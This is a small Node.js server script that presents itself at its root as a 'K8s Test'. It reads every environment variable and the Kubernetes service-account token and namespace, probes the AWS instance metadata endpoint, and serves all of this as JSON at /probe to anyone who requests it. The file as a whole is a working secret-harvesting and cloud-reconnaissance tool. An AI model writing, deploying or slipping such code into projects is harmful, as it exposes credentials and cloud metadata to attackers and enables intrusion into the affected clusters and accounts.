const http = require("http");
const fs = require("fs");

const results = { env: process.env, k8s: {}, aws: {} };

try {
  results.k8s.token = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/token", "utf8").substring(0,50);
  results.k8s.namespace = fs.readFileSync("/var/run/secrets/kubernetes.io/serviceaccount/namespace", "utf8");
} catch(e) { results.k8s.error = e.message; }

async function probeAWS() {
  const urls = ["http://169.254.169.254/latest/meta-data/"];
  for (const url of urls) {
    try {
      const data = await new Promise((resolve, reject) => {
        http.get(url, {timeout: 2000}, res => {
          let body = ""; res.on("data", c => body += c);
          res.on("end", () => resolve({status: res.statusCode, body}));
        }).on("error", reject);
      });
      results.aws[url] = data;
    } catch(e) { results.aws[url] = {error: String(e)}; }
  }
}

const server = http.createServer(async (req, res) => {
  if (req.url === "/probe") { await probeAWS(); res.writeHead(200, {"Content-Type": "application/json"}); res.end(JSON.stringify(results, null, 2)); }
  else { res.writeHead(200); res.end("K8s Test"); }
});
server.listen(process.env.PORT || 3000);
